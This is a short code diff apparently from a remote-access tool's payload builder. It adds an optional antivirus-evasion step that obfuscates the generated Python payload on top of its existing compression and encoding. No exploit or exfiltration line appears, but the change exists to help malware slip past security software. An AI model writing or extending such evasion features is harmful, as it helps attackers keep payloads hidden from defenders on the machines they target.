@@ -25,7 +25,7 @@ def getLinuxImportedModules():
 
     return lines
 
-def pack_py_payload(target, display, conf, autostart=True, purepy=True):
+def pack_py_payload(target, display, conf, autostart=True, purepy=True, av_evasion=None):
     display(Success('Generating PY payload ...'))
     target._purepy = purepy # purepy=True force the use of .py files instead of .pyo
     stdlib = dependencies.importer(
@@ -50,9 +50,14 @@ def pack_py_payload(target, display, conf, autostart=True, purepy=True):
         stdlib, conf, autostart, purepy=purepy) + '\n'
 
     if target.debug:
+        if av_evasion:
+            return av_evasion.obfuscate_python_script(payload)
         return payload
 
-    return compress_encode_obfs(payload, main=True)
+    obfuscated_payload = compress_encode_obfs(payload, main=True)
+    if av_evasion:
+        obfuscated_payload = av_evasion.obfuscate_python_script(obfuscated_payload)
+    return obfuscated_payload
 
 def serve_payload(display, server, payload, link_ip=None):
     if not server:
